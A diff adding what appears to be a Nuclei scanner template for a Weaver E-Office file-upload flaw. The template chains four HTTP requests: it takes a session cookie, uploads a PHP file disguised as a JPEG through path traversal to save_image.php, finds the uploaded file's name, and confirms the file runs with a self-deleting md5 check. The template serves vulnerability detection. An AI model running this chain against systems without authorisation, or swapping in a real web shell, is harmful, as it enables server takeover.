@@ -1,0 +1,91 @@
+id: weaver-eoffice-file-upload
+info:
+  name: Weaver E-Office File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    E-office has a privilege bypass vulnerability that allows attackers to upload arbitrary files, potentially leading to server control.
+  tags: fileupload,permissionbypass
+  reference:
+    - https://www.weaver.com.cn/
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: get-session-cookie
+    method: GET
+    path:
+      - "{{BaseURL}}/sample.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?);"
+
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/general/system/interface/theme_set/save_image.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymzrNfz1ehkVc9A3Z
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Accept-Encoding: gzip, deflate
+      Cookie: "PHPSESSID={{session_cookie}}"
+    body: |
+      ------WebKitFormBoundarymzrNfz1ehkVc9A3Z
+      Content-Disposition: form-data; name="image_type"
+
+      ../../clientTools
+      ------WebKitFormBoundarymzrNfz1ehkVc9A3Z
+      Content-Disposition: form-data; name="upfile"; filename="1.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5(233);unlink(__FILE__);?>
+      ------WebKitFormBoundarymzrNfz1ehkVc9A3Z
+      Content-Disposition: form-data; name="theme_name"
+
+      theme3
+      ------WebKitFormBoundarymzrNfz1ehkVc9A3Z--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: retrieve-filename
+    method: GET
+    path:
+      - "{{BaseURL}}/general/down.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        name: uploaded_filename
+        internal: true
+        part: body
+        regex:
+          - "<tr class=TableLine1><td>(.*?)</td><td>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/clientTools/{{uploaded_filename}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
